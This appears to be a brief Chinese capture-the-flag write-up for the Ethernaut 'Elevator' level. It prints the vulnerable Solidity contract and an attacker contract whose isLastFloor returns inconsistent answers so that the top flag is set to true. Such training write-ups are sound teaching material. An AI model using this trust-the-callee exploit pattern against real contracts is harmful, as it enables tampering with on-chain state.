# Elevator
> 登上理塘最高峰！

[link](https://ethernaut.openzeppelin.com/level/0x4A151908Da311601D967a6fB9f8cFa5A3E88a251)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

这道题的目标是为了修改top为true，那么显而易见的，我们需要构造一个根据状态变化的`isLastFloor`函数

```solidity
contract BuildingInstance is Building {
    Elevator public addr;

    constructor(address addr_) {
        addr = Elevator(addr_);
    }
    function isLastFloor(uint val) external view returns (bool) {
        if (val > addr.floor()) {
            return false;
        } else {
            return true;
        }
    }

    function attack(uint val) external {
        addr.goTo(val);
    }

}
```
